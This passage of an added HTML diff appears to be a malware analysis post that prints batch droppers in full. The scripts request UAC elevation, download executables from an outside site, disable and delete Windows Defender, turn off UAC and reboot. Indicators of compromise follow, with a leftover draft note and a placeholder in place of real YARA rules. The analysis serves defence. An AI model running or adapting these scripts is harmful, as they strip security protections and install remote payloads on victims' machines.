+<span class="p">)</span> <span class="k">else</span> <span class="p">(</span> <span class="n">goto</span> <span class="n">gotAdmin</span> <span class="p">)</span>
+
+<span class="ss">:UACPrompt</span>
+    <span class="n">echo</span> <span class="no">Set</span> <span class="no">UAC</span> <span class="o">=</span> <span class="no">CreateObject</span><span class="o">^</span><span class="p">(</span><span class="s2">"Shell.Application"</span><span class="o">^</span><span class="p">)</span> <span class="o">&gt;</span> <span class="s2">"%temp%</span><span class="se">\g</span><span class="s2">etadmin.vbs"</span>
+    <span class="n">set</span> <span class="n">params</span> <span class="o">=</span> <span class="sx">%*:"="
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 &gt;&gt; "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+
+:gotAdmin
+
+
+powershell Invoke-WebRequest https://pornofilmspremium.com/javase.exe -OutFile javase.exe
+set pop=%systemroot%
+javase -U:T reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
+javase -U:T sc config WinDefend start= disabled
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+powershell Invoke-WebRequest https://pornofilmspremium.com/autorun100.bat -OutFile autorun100.bat
+powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+powershell.exe -command "Set-MpPreference -PUAProtection disable"
+shutdown.exe /r /f /t 00</span></code></pre></figure>
+
+<p>The script therefore yet again reaches out to the same website it originates from and after disabling UAC controls, Defender, modifies the  HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system registry, and runs several further .bat scripts and initiates a restart for the changes to take place.</p>
+
+<p>Autorun.bat’s content:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="vi">@echo</span> <span class="n">off</span>
+<span class="n">title</span> <span class="no">Installing</span> <span class="no">Packages</span> 
+<span class="o">::</span> <span class="no">BatchGotAdmin</span>
+<span class="o">::-------------------------------------</span>
+<span class="no">REM</span>  <span class="o">--&gt;</span> <span class="no">Check</span> <span class="k">for</span> <span class="n">permission</span>
+<span class="o">&gt;</span><span class="n">nul</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="s2">"%SYSTEMROOT%</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">acls.exe"</span> <span class="s2">"%SYSTEMROOT%</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">onfig</span><span class="se">\s</span><span class="s2">ystem"</span>
+
+<span class="no">REM</span> <span class="o">--&gt;</span> <span class="no">If</span> <span class="n">error</span> <span class="n">flag</span> <span class="n">set</span><span class="p">,</span> <span class="n">we</span> <span class="k">do</span> <span class="n">not</span> <span class="n">have</span> <span class="n">admin</span><span class="p">.</span>
+<span class="nf">if</span> <span class="s1">'%errorlevel%'</span> <span class="no">NEQ</span> <span class="s1">'0'</span> <span class="p">(</span>
+    <span class="n">echo</span> <span class="no">Requesting</span> <span class="n">administrative</span> <span class="n">privileges</span><span class="o">...</span><span class="p">.</span>
+    <span class="nf">goto</span> <span class="no">UACPrompt</span>
+<span class="p">)</span> <span class="k">else</span> <span class="p">(</span> <span class="n">goto</span> <span class="n">gotAdmin</span> <span class="p">)</span>
+
+<span class="ss">:UACPrompt</span>
+    <span class="n">echo</span> <span class="no">Set</span> <span class="no">UAC</span> <span class="o">=</span> <span class="no">CreateObject</span><span class="o">^</span><span class="p">(</span><span class="s2">"Shell.Application"</span><span class="o">^</span><span class="p">)</span> <span class="o">&gt;</span> <span class="s2">"%temp%</span><span class="se">\g</span><span class="s2">etadmin.vbs"</span>
+    <span class="n">set</span> <span class="n">params</span> <span class="o">=</span> <span class="sx">%*:"="
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 &gt;&gt; "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+
+:gotAdmin
+
+
+powershell Invoke-WebRequest https://pornofilmspremium.com/javase.exe -OutFile javase.exe
+
+set pop=%systemroot%
+javase -U:T -ShowWindowMode:Hide  sc delete  windefend
+start /b "" cmd /c del "%~f0"&amp;exit /b</span></code></pre></figure>
+
+<p>It continues to run the exe in hidden mode.</p>
+
+<h2 id="iocs">IOCs:</h2>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">SHA256</span><span class="p">:</span> <span class="mi">678</span><span class="n">f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b</span> 
+<span class="no">SHA256</span><span class="p">:</span> <span class="mi">678</span><span class="n">f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b</span> <span class="p">?</span><span class="sc">??</span> <span class="n">fix</span> <span class="n">both</span> <span class="n">links</span> <span class="n">here</span> <span class="n">and</span>
+<span class="no">SHA256</span><span class="p">:</span> <span class="n">ba1e4fd49e7c2aebd06ad3e22e6cf8f4d433fa57c6cc45167c9859c7f35eaa2f</span> 
+<span class="no">URL</span><span class="p">:</span> <span class="n">hxxps</span><span class="ss">:/</span><span class="o">/</span><span class="n">websekir</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">g00glbat</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">processingSetRequestBat</span><span class="o">/</span><span class="p">?</span><span class="n">servername</span><span class="o">=</span><span class="n">msi</span>
+<span class="no">URL</span><span class="p">:</span> <span class="n">hxxps</span><span class="ss">:/</span><span class="o">/</span><span class="n">pornofilmspremium</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">tim</span><span class="o">.</span><span class="no">EXE</span>
+<span class="no">CLI</span><span class="p">:</span> </code></pre></figure>
+
+<p>VT Content Search for similar files(TBD) :</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Hexadecimal</span> 	<span class="n">content</span><span class="p">:{</span><span class="no">CAFEBABE</span><span class="p">}</span></code></pre></figure>
+
+<h2 id="yara-rules">YARA Rules:</h2>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Hexadecimal</span> 	<span class="n">content</span><span class="p">:{</span><span class="no">CAFEBABE</span><span class="p">}</span></code></pre></figure>
+
+:ET
